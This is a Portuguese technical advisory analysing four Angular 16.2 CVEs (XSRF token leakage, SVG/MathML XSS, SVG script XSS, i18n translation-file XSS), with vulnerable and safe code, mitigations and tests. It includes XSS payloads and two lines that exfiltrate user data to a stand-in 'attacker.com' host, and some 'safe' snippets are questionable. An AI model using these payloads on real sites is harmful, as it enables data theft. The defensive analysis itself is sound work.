# 🔍 Análise Técnica Detalhada de CVEs

**Chatbot Platform Skeleton - Documentação de Vulnerabilidades Identificadas**

---

## Visão Geral

Este documento fornece análise técnica profunda de cada CVE identificado, incluindo:
- Mecanismos de exploração
- Exemplos de código vulnerável e seguro
- Análise de impacto
- Testes para verificar mitigação

---

## 1. CVE-2025-66035: XSRF Token Leakage via Protocol-Relative URLs

### Identificação

| Propriedade | Valor |
|------------|-------|
| CVE ID | CVE-2025-66035 |
| Severity | HIGH |
| CVSS Score | Não especificado |
| Tipo | Credential Leak / XSRF Token Leakage |
| Afetado | `@angular/common@16.2.0` |

### Descrição Técnica

O Angular HttpClient implementa proteção XSRF verificando se o URL de requisição começa com um protocolo (`http://` ou `https://`). A intenção é identificar requisições cross-origin.

**Falha de Lógica:**
URLs relativas ao protocolo (protocol-relative URLs) começam com `//` e são projetadas para usar o mesmo protocolo da página atual. Por exemplo:
- Se a página está em `https://app.com`, uma URL `//attacker.com/path` é interpretada como `https://attacker.com/path`

**Vulnerabilidade:**
O HttpClient do Angular incorretamente trata URLs que começam com `//` como requisições same-origin porque não começam com um protocolo explícito (`http://` ou `https://`). Como resultado:

1. O angular XSRF protection acha que é same-origin
2. Automaticamente adiciona o token XSRF ao header `X-XSRF-TOKEN`
3. A requisição é enviada para `//attacker.com`
4. O navegador resolve como `https://attacker.com` (cross-origin)
5. **Resultado:** Token XSRF é vazado para atacante controlado

### Exemplo de Código Vulnerável

```typescript
// app.component.ts (VULNERÁVEL)
import { HttpClient } from '@angular/common/http';

@Component({...})
export class AppComponent {
  constructor(private http: HttpClient) {}

  transfer() {
    const maliciousUrl = '//attacker.com/collect';
    
    // Sem perceber, esta requisição incluirá o token XSRF
    this.http.post(maliciousUrl, {
      action: 'transfer',
      amount: 1000
    }).subscribe(
      response => console.log('Sent'), // Silenciosamente enviado
      error => console.log('Error')
    );
  }
}
```

**O que acontece:**
1. Usuario autenticado está em `app.com`
2. Aplicação está comprometida ou atacante consegue injetar código
3. `//attacker.com/collect` é chamado
4. Navegador envia para `https://attacker.com/collect` (porque página está em HTTPS)
5. **PROBLEMA:** Header `X-XSRF-TOKEN` é incluído (deveria ter sido removido!)
6. Atacante captura token XSRF válido

### Exemplo de Código Seguro

```typescript
// app.component.ts (SEGURO)
import { HttpClient } from '@angular/common/http';

@Component({...})
export class AppComponent {
  constructor(private http: HttpClient) {}

  transfer() {
    // ✅ OPÇÃO 1: URL relativa (começa com /)
    // HttpClient reconhece como same-origin, XSRF token incluído
    this.http.post('/api/transfer', {
      action: 'transfer',
      amount: 1000
    }).subscribe(...);

    // ✅ OPÇÃO 2: URL absoluta para backend confiável (HTTPS)
    // HttpClient reconhece como same-origin (mesmo domínio)
    this.http.post('https://app.com/api/transfer', {
      action: 'transfer',
      amount: 1000
    }).subscribe(...);

    // ✅ OPÇÃO 3: Construir URL dinamicamente com validação
    const baseUrl = window.location.origin;
    const apiUrl = new URL('/api/transfer', baseUrl).toString();
    this.http.post(apiUrl, {...}).subscribe(...);

    // ❌ NUNCA FAZER: Protocol-relative URLs para APIs
    // this.http.post('//api.app.com/transfer', {...}); // NUNCA!
  }
}
```

### Como Mitigar (até conseguir atualizar)

**1. Code Review:**
```bash
# Procurar por protocol-relative URLs no código
grep -r "'//" src/
grep -r '"//' src/
grep -r "'//http" src/
grep -r '"//http' src/
```

**2. Validação de URLs:**
```typescript
// Criar utility para validar URLs seguras
export class UrlValidator {
  static isSafeUrl(url: string): boolean {
    // Deve ser relativa (/) ou absoluta com protocolo explícito
    return url.startsWith('/') || 
           url.startsWith('http://') || 
           url.startsWith('https://') ||
           url.startsWith('data:') ||
           url.startsWith('blob:');
  }

  static validateApiUrl(url: string): string {
    if (!this.isSafeUrl(url)) {
      throw new Error(`Unsafe URL detected: ${url}`);
    }
    return url;
  }
}

// Usar em HttpClient interceptor
import { HttpInterceptor, HttpRequest, HttpHandler, HttpEvent } from '@angular/common/http';

@Injectable()
export class UrlValidationInterceptor implements HttpInterceptor {
  intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
    if (!UrlValidator.isSafeUrl(req.url)) {
      throw new Error(`Blocked unsafe URL: ${req.url}`);
    }
    return next.handle(req);
  }
}
```

**3. Content Security Policy (CSP):**
```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://api.seu-dominio.com;
  img-src 'self' data: https:;
">
```

---

## 2. CVE-2025-66412: Stored XSS via SVG Animation, URL e Atributos MathML

### Identificação

| Propriedade | Valor |
|------------|-------|
| CVE ID | CVE-2025-66412 |
| Severity | HIGH |
| CVSS Score | Não especificado |
| Tipo | Stored Cross-Site Scripting (XSS) |
| Afetado | `@angular/compiler@16.2.0` |

### Descrição Técnica

O compilador de templates do Angular mantém um esquema de segurança interno que classifica certos atributos e contextos como requerendo sanitização. Este esquema está **incompleto** em Angular 16.2.0:

**Problema 1: Atributos SVG/MathML não sanitizados**
- Atributos que podem conter URLs não são classificados como "Resource URL" context
- O compilador não sanitiza `xlink:href`, `href` em SVG/MathML
- Permite injeção de `javascript:` URLs

**Problema 2: Validação de SVG animation**
- O atributo `attributeName` em elementos SVG (`<animate>`, `<set>`, etc.) não é validado
- Permite que atacantes direcionem dinamicamente atributos sensíveis
- Combinado com valores `javascript:`, permite execução de código

### Exemplo de Código Vulnerável

```typescript
// component.ts (VULNERÁVEL)
import { Component } from '@angular/core';

@Component({
  selector: 'app-svg',
  template: `
    <svg>
      <!-- Vulnerabilidade 1: xlink:href com dados dinamicos -->
      <image [attr.xlink:href]="userProvidedUrl"></image>
      
      <!-- Vulnerabilidade 2: SVG animation attributeName -->
      <animate 
        [attributeName]="animationProperty"
        [values]="userProvidedValue">
      </animate>

      <!-- Vulnerabilidade 3: MathML href -->
      <math>
        <annotation [attr.href]="userContent"></annotation>
      </math>
    </svg>
  `
})
export class SvgComponent {
  // Assumir que dados vêm de API ou input do usuário
  userProvidedUrl = 'javascript:alert("XSS")';
  animationProperty = 'href';
  userProvidedValue = 'javascript:fetch("/api/steal-data")';
  userContent = 'javascript:void(0)';
}
```

**Fluxo de Ataque:**

1. **Origem dos Dados:**
   - Database com dados de usuário comprometidos
   - API externa retorna conteúdo malicioso
   - Parâmetro de URL não sanitizado

2. **Renderização:**
   ```html
   <!-- Resultado renderizado -->
   <image xlink:href="javascript:alert('XSS')"></image>
   
   <animate 
     attributeName="href" 
     values="javascript:fetch('/api/steal-data')">
   </animate>
   ```

3. **Execução:**
   - Usuário interage com SVG (clique)
   - Animação é acionada
   - JavaScript malicioso é executado

### Exemplo de Código Seguro

```typescript
// component.ts (SEGURO)
import { Component } from '@angular/core';
import { DomSanitizer, SafeResourceUrl } from '@angular/platform-browser';

@Component({
  selector: 'app-svg-safe',
  template: `
    <svg>
      <!-- ✅ OPÇÃO 1: Usar values estáticos -->
      <image xlink:href="assets/image.svg"></image>
      
      <!-- ✅ OPÇÃO 2: Sanitizar explicitamente -->
      <image [attr.xlink:href]="sanitizedUrl"></image>
      
      <!-- ✅ OPÇÃO 3: Usar property binding ao invés de attribute -->
      <image [src]="imagePath"></image>
      
      <!-- ✅ OPÇÃO 4: Validar e whitelist -->
      <image *ngIf="isValidImageUrl(userUrl)" 
             [attr.xlink:href]="userUrl"></image>
      
      <!-- ✅ OPÇÃO 5: Usar DomSanitizer -->
      <image [attr.xlink:href]="sanitizer.sanitize(SecurityContext.RESOURCE_URL, userUrl)"></image>
    </svg>
  `
})
export class SvgSafeComponent {
  imagePath = 'assets/image.svg';
  sanitizedUrl: SafeResourceUrl;

  constructor(private sanitizer: DomSanitizer) {
    this.sanitizedUrl = this.sanitizer.bypassSecurityTrustResourceUrl(
      'assets/image.svg' // Apenas URLs confiáveis!
    );
  }

  // ✅ Validação de whitelist
  isValidImageUrl(url: string): boolean {
    const allowedDomains = [
      'https://trusted-cdn.com',
      'https://our-domain.com'
    ];
    
    try {
      const urlObj = new URL(url, window.location.origin);
      return allowedDomains.some(domain => urlObj.origin === new URL(domain).origin);
    } catch {
      return false;
    }
  }

  // ✅ Sanitizar URLs quando necessário
  getSafeUrl(userUrl: string): SafeResourceUrl | null {
    if (!this.isValidImageUrl(userUrl)) {
      console.warn(`Invalid image URL: ${userUrl}`);
      return null;
    }
    return this.sanitizer.bypassSecurityTrustResourceUrl(userUrl);
  }
}
```

### Padrão Seguro com Data Binding

```typescript
// data.service.ts
@Injectable()
export class DataService {
  getContent(): Observable<SafeContent> {
    return this.http.get<Content>('/api/content').pipe(
      map(content => this.sanitizeContent(content))
    );
  }

  private sanitizeContent(content: Content): SafeContent {
    return {
      ...content,
      imageUrl: this.sanitizeUrl(content.imageUrl),
      animationValues: this.sanitizeAnimationValues(content.animationValues)
    };
  }

  private sanitizeUrl(url: string): string {
    // Validar formato
    if (!this.isValidUrl(url)) {
      return 'assets/placeholder.svg';
    }
    return url;
  }

  private sanitizeAnimationValues(values: string): string {
    // Remover javascript: urls
    return values.replace(/javascript:/gi, '');
  }

  private isValidUrl(url: string): boolean {
    try {
      const obj = new URL(url, window.location.origin);
      return ['https:', 'http:', 'data:', 'blob:'].includes(obj.protocol);
    } catch {
      return false;
    }
  }
}
```

### Como Mitigar (até conseguir atualizar)

**1. Usar Content Security Policy:**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  img-src 'self' data: blob: https:;
  style-src 'self' 'unsafe-inline';
">
```

**2. Evitar SVG dinâmico:**
```typescript
// ❌ RUIM: SVG inline com dados dinâmicos
<svg [innerHTML]="dynamicSvgContent"></svg>

// ✅ BOM: SVG inline com propriedades estáticas
<svg>
  <image xlink:href="static-path/image.svg"></image>
</svg>

// ✅ BOM: SVG como arquivo externo
<img [src]="'static-path/image.svg'">
```

**3. DomSanitizer explícito:**
```typescript
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

getSafeSvg(): SafeHtml {
  // Apenas para SVG estático e confiável
  const trustedSvg = `
    <svg>
      <circle cx="50" cy="50" r="40" fill="blue"/>
    </svg>
  `;
  return this.sanitizer.sanitize(SecurityContext.HTML, trustedSvg);
}
```

---

## 3. CVE-2026-22610: XSS via Unsanitized SVG Script Attributes

### Identificação

| Propriedade | Valor |
|------------|-------|
| CVE ID | CVE-2026-22610 |
| Severity | HIGH |
| CVSS Score | Não especificado |
| Tipo | Cross-Site Scripting (XSS) |
| Afetado | `@angular/compiler@16.2.0`, `@angular/core@16.2.0` |

### Descrição Técnica

SVG permite elementos `<script>` que podem carregar código JavaScript externo via atributo `href` ou `xlink:href`. O compilador do Angular não classifica esses atributos como requerendo sanitização de "Resource URL".

**Vulnerabilidade:**
Quando dados dinâmicos são vinculados a atributos `href` ou `xlink:href` de elementos SVG `<script>`, o compilador não sanitiza ou valida, permitindo injeção de:
- `data:text/javascript` URIs
- URLs para scripts maliciosos
- `javascript:` URIs

### Exemplo de Código Vulnerável

```typescript
// component.ts (VULNERÁVEL)
@Component({
  selector: 'app-svg-script',
  template: `
    <svg>
      <!-- Vulnerável: href com dados dinâmicos -->
      <script [attr.href]="scriptUrl"></script>
      
      <!-- Vulnerável: xlink:href com dados dinâmicos -->
      <script [attr.xlink:href]="scriptUrl"></script>
    </svg>
  `
})
export class SvgScriptComponent {
  // Dados da API/database - potencialmente comprometidos
  scriptUrl = 'data:text/javascript,alert("XSS")';
  
  // OU
  // scriptUrl = 'javascript:fetch("/api/user/data").then(r=>r.json()).then(d=>fetch("//attacker.com?data="+btoa(JSON.stringify(d))))';
}
```

**Renderização:**
```html
<svg>
  <script href="data:text/javascript,alert('XSS')"></script>
</svg>
```

**Execução:**
- Navegador interpreta href de script como URL de recurso
- Carrega e executa o código JavaScript

### Exemplo de Código Seguro

```typescript
// component.ts (SEGURO)
@Component({
  selector: 'app-svg-script-safe',
  template: `
    <svg>
      <!-- ✅ OPÇÃO 1: Não usar SVG scripts com atributos dinâmicos -->
      <!-- Usar script tags normais em body ao invés -->
      
      <!-- ✅ OPÇÃO 2: Se absolutamente necessário SVG script, usar apenas URLs confiáveis -->
      <script 
        *ngIf="isValidScriptUrl(scriptUrl)"
        [attr.href]="scriptUrl">
      </script>
      
      <!-- ✅ OPÇÃO 3: Usar script externo importado normalmente -->
      <!-- Não usar SVG para scripts -->
    </svg>
  `
})
export class SvgScriptSafeComponent {
  allowedScriptDomains = [
    'https://trusted-cdn.example.com',
    'https://our-domain.com'
  ];

  isValidScriptUrl(url: string): boolean {
    if (!url) return false;
    
    try {
      // Apenas HTTPS URLs de domínios confiáveis
      const urlObj = new URL(url);
      
      return urlObj.protocol === 'https:' &&
             this.allowedScriptDomains.some(domain => {
               const trustedDomain = new URL(domain);
               return urlObj.origin === trustedDomain.origin;
             });
    } catch {
      return false;
    }
  }

  // ✅ MELHOR: Carregar scripts normalmente via tag script
  loadScript(src: string) {
    if (!this.isValidScriptUrl(src)) {
      console.error(`Invalid script URL: ${src}`);
      return;
    }

    const script = document.createElement('script');
    script.src = src;
    script.async = true;
    document.body.appendChild(script);
  }
}
```

### Padrão Recomendado

```typescript
// Nunca confie em dados externos para URLs de scripts
// Sempre whitelist URLs conhecidas

@Component({...})
export class SafeScriptLoader {
  private allowedScripts = new Map<string, string>([
    ['analytics', 'https://cdn.example.com/analytics.js'],
    ['tracking', 'https://trusted-provider.com/tracking.js']
  ]);

  loadScript(scriptKey: string): Promise<void> {
    const scriptUrl = this.allowedScripts.get(scriptKey);
    
    if (!scriptUrl) {
      return Promise.reject(`Unknown script: ${scriptKey}`);
    }

    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = scriptUrl;
      script.onload = () => resolve();
      script.onerror = () => reject(`Failed to load ${scriptUrl}`);
      document.body.appendChild(script);
    });
  }
}
```

---

## 4. CVE-2026-27970: XSS via i18n ICU Messages

### Identificação

| Propriedade | Valor |
|------------|-------|
| CVE ID | CVE-2026-27970 |
| Severity | HIGH |
| CVSS Score | Não especificado |
| Tipo | Cross-Site Scripting (XSS) - i18n/ICU Messages |
| Afetado | `@angular/core@16.2.0` |

### Descrição Técnica

Angular i18n (internacionalização) envolve:
1. Extração de mensagens no idioma fonte
2. Envio a contractors para tradução
3. Importação de traduções de volta

**Vulnerabilidade:**
Se um arquivo de tradução (XLIFF, XTB) for comprometido ou contiver conteúdo malicioso, as mensagens ICU (International Components for Unicode) não são adequadamente sanitizadas, permitindo execução de HTML/JavaScript.

**Diferença desta vulnerabilidade:**
- Não é XSS tradicional explorada por usuários
- Requer comprometimento da supply chain (arquivo de tradução)
- Mais "Supplier-Origin XSS" do que "User-Origin XSS"

### Exemplo de Código Vulnerável

```typescript
// app.component.ts (VULNERÁVEL)
@Component({
  selector: 'app-root',
  template: `
    <p i18n>Hello {{ userName }}!</p>
    
    <!-- Com ICU message -->
    <div i18n>
      {messageCount, plural,
        =0 {No messages}
        =1 {One message}
        other {{{ messageCount }} messages}}
    </div>
  `
})
export class AppComponent {
  userName: string; // Vem de API
  messageCount: number;
}
```

**Arquivo de tradução comprometido (pt-BR.xliff):**
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
  <file source-language="en" datatype="plaintext">
    <body>
      <trans-unit id="hello-user">
        <source>Hello {{ userName }}!</source>
        <!-- COMPROMETIDO: Contém HTML/JS malicioso -->
        <target>Olá <script>fetch('/api/user').then(r=>r.json()).then(d=>fetch('//attacker.com?data='+btoa(JSON.stringify(d))))</script>{{ userName }}!</target>
      </trans-unit>
    </body>
  </file>
</xliff>
```

**Resultado:**
Quando a página é renderizada em português, o script malicioso é executado.

### Exemplo de Código Seguro

```typescript
// app.component.ts (SEGURO)
import { Component, SecurityContext } from '@angular/core';
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  selector: 'app-root',
  template: `
    <!-- ✅ i18n com apenas dados simples -->
    <p i18n>Hello {{ userName }}!</p>
    
    <!-- ✅ Evitar HTML complexo em i18n -->
    <div>
      <span i18n>Messages:</span>
      <strong>{{ messageCount }}</strong>
    </div>
    
    <!-- ✅ Se precisar de HTML dinâmico, sanitizar -->
    <div [innerHTML]="sanitizer.sanitize(SecurityContext.HTML, translatedHtml)"></div>
  `
})
export class AppComponent {
  userName: string;
  messageCount: number;

  constructor(public sanitizer: DomSanitizer) {}
}
```

### Verificar Integridade de Arquivos de Tradução

```typescript
// translation-integrity.service.ts
@Injectable()
export class TranslationIntegrityService {
  
  // Hashes de arquivos de tradução verificados
  private knownTranslationHashes = new Map<string, string>([
    ['pt-BR.xliff', 'sha256:abc123...'],
    ['en.xliff', 'sha256:def456...']
  ]);

  async verifyTranslationFile(
    locale: string,
    content: string
  ): Promise<boolean> {
    const hash = await this.sha256Hash(content);
    const expectedHash = this.knownTranslationHashes.get(`${locale}.xliff`);
    
    if (!expectedHash) {
      console.warn(`No known hash for locale ${locale}`);
      return false;
    }

    if (hash !== expectedHash) {
      console.error(`Translation file hash mismatch for ${locale}`);
      console.error(`Expected: ${expectedHash}`);
      console.error(`Got: ${hash}`);
      return false;
    }

    return true;
  }

  private async sha256Hash(text: string): Promise<string> {
    const buffer = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(text)
    );
    return Array.from(new Uint8Array(buffer))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  }
}
```

### Mitigação: Content Security Policy

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'wasm-unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.seu-dominio.com;
">
```

### Mitigação: Trusted Types

```typescript
// trusted-types-policy.ts
if (window.trustedTypes) {
  // Criar política personalizada
  const policy = window.trustedTypes.createPolicy('default', {
    createHTML: (input) => {
      // Verificar se HTML é confiável
      const parser = new DOMParser();
      const doc = parser.parseFromString(input, 'text/html');
      
      // Apenas permitir elementos seguros
      const ALLOWED_TAGS = ['p', 'div', 'span', 'strong', 'em'];
      const isAllowed = Array.from(doc.querySelectorAll('*')).every(el =>
        ALLOWED_TAGS.includes(el.tagName.toLowerCase())
      );
      
      if (!isAllowed) {
        throw new Error('HTML conteúdo não permitido');
      }
      
      return input;
    }
  });
}
```

---

## Resumo Técnico

| CVE | Tipo | Root Cause | Ataque Precondition | Impacto |
|-----|------|-----------|-------------------|--------|
| CVE-2025-66035 | Token Leak | Validação de URL inadequada | Protocol-relative URL | XSRF Token vazado |
| CVE-2025-66412 | Stored XSS | Sanitização schema incompleta | Dados dinâmicos em SVG/MathML attrs | Execução JS arbitrária |
| CVE-2026-22610 | XSS | Resource URL validation falha | Dados dinâmicos em SVG script attrs | Execução JS arbitrária |
| CVE-2026-27970 | Supply Chain XSS | ICU message não sanitizado | Arquivo de tradução comprometido | Execução JS arbitrária |

---

## Testes de Segurança Recomendados

### 1. Teste Manual

```bash
# No console do navegador (F12 > Console):

# Testar XSRF protection
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({amount: 1000}),
  credentials: 'include'
}).then(r => r.text()).then(console.log);

# Verificar se header X-XSRF-TOKEN está presente
# (Abrir Network tab para verificar headers)
```

### 2. Teste Automatizado

```typescript
// security.spec.ts
describe('Security Tests', () => {
  
  it('should not allow protocol-relative URLs in HttpClient', () => {
    const httpClient = TestBed.inject(HttpClient);
    
    expect(() => {
      httpClient.post('//attacker.com', {}).subscribe();
    }).toThrow();
  });

  it('should sanitize SVG elements by default', () => {
    const fixture = TestBed.createComponent(SvgComponent);
    const compiled = fixture.nativeElement;
    
    // Verificar que script tag foi removida
    expect(compiled.querySelectorAll('script').length).toBe(0);
  });

  it('should not execute javascript: URLs in SVG', () => {
    const sanitizer = TestBed.inject(DomSanitizer);
    const maliciousUrl = 'javascript:alert("XSS")';
    
    const safe = sanitizer.sanitize(
      SecurityContext.RESOURCE_URL,
      maliciousUrl
    );
    
    expect(safe).not.toContain('javascript:');
  });
});
```

---

**Análise compilada em 12 de Março de 2026**

